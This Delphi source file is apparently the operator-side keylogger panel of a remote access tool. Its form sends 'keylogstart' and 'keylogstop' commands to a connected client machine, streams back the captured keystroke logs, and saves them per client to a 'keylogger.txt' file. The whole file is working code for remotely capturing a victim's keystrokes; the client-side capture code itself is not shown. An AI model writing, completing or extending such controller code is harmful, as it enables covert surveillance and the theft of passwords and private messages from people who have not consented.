unit UnitKeylogger;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.StdCtrls,
  System.JSON, ncLines, System.IOUtils;

type
  TSendJSONCallback = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterCallback = procedure(aLine: TncLine) of object;

  TForm7 = class(TForm)
    StatusBar1: TStatusBar;
    Panel1: TPanel;
    Button1: TButton;
    Memo1: TMemo;
    Button2: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    FClientLine: TncLine;
    FClientID: string;
    FIsCapturing: Boolean;
    FOnSendJSON: TSendJSONCallback;
    FOnUnregister: TUnregisterCallback;
    procedure SetCapturing(Value: Boolean);
  public
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      SendJSONCB: TSendJSONCallback; UnregisterCB: TUnregisterCallback);
    procedure HandleKeyloggerJSON(JSONObj: TJSONObject);
    procedure DetachCallbacks;
  end;

var
  Form7: TForm7;

implementation

{$R *.dfm}

procedure TForm7.SetupForClient(aLine: TncLine; const ClientID: string;
  SendJSONCB: TSendJSONCallback; UnregisterCB: TUnregisterCallback);
begin
  FClientLine := aLine;
  FClientID := ClientID;
  FOnSendJSON := SendJSONCB;
  FOnUnregister := UnregisterCB;
  Caption := 'Keylogger - ' + ClientID;
  SetCapturing(False);
end;

procedure TForm7.SetCapturing(Value: Boolean);
begin
  FIsCapturing := Value;
  if FIsCapturing then
  begin
    Button1.Caption := 'Stop Capturing';
    StatusBar1.Panels[0].Text := 'Status [on]';
  end
  else
  begin
    Button1.Caption := 'Start Capturing';
    StatusBar1.Panels[0].Text := 'Status [off]';
  end;
end;

procedure TForm7.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FClientLine) or not Assigned(FOnSendJSON) then Exit;

  JSONObj := TJSONObject.Create;
  try
    if not FIsCapturing then
      JSONObj.AddPair('action', 'keylogstart')
    else
      JSONObj.AddPair('action', 'keylogstop');

    FOnSendJSON(FClientLine, JSONObj);
    SetCapturing(not FIsCapturing);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm7.Button2Click(Sender: TObject);
var
  DirPath, FilePath: string;
begin
  DirPath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
  DirPath := TPath.Combine(DirPath, FClientID);

  try
    if not TDirectory.Exists(DirPath) then
      TDirectory.CreateDirectory(DirPath);

    FilePath := TPath.Combine(DirPath, 'keylogger.txt');
    Memo1.Lines.SaveToFile(FilePath);

    StatusBar1.Panels[0].Text := 'Saved to: ' + FilePath;
  except
    on E: Exception do
      ShowMessage('Error saving file: ' + E.Message);
  end;
end;

procedure TForm7.HandleKeyloggerJSON(JSONObj: TJSONObject);
var
  LogValue: string;
begin
  if not Assigned(JSONObj) then Exit;

  if JSONObj.Values['log'] <> nil then
  begin
    LogValue := JSONObj.Values['log'].Value;
    Memo1.SelStart := Length(Memo1.Text);
    Memo1.SelText := LogValue;
    // Auto scroll to bottom
    SendMessage(Memo1.Handle, WM_VSCROLL, SB_BOTTOM, 0);
  end;
end;

procedure TForm7.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FOnUnregister) then
    FOnUnregister(FClientLine);
  Action := caFree;
end;

procedure TForm7.DetachCallbacks;
begin
  FClientLine := nil;
  FOnSendJSON := nil;
  FOnUnregister := nil;
  StatusBar1.Panels[0].Text := 'Status [Disconnected]';
end;

end.
